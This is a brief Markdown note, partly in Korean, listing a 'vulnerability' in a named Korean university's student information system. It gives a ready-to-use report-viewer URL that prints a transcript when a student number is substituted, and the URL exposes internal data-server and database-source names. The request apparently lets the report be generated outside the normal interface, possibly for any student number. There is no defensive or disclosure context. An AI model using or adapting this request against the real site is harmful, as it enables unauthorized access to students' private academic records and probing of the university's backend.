## 한국교통대학교 종합정보시스템 (is.ut.ac.kr) Vulnerabilities

### 성적표 출력
* Request in Internet Explorer to install cxViewer plugin
* Query string: Change \<STUDENT-NUMBER\> to your student number
    * `https://is.ut.ac.kr/cxViewer/RdView.jsp?view_mode=rdopen_non_output();&param=%2Frp%20%20%5B2020%2D08%2D14%5D%20%5B<STUDENT-NUMBER>%5D%20%5B91215035%5D%20%5B<STUDENT-NUMBER>%5D%20%5B%5D%20%5B<STUDENT-NUMBER>%5D%20%5B00%5D%20%5B%25%5D%20%5B%25%5D%20%2Frl%20%5B%5D%20%2Frfn%20%5Bhttps%3A%2F%2Fis%2Eut%2Eac%2Ekr%2FDataServer%2Frdagent%2Ejsp%5D%20%2Frsn%20%5Bjdbc%2Fusop%5D&mrd=%2FGA%2FSC%2FSC02%2FMRD%2Fcsga%5F04063%2Emrd`
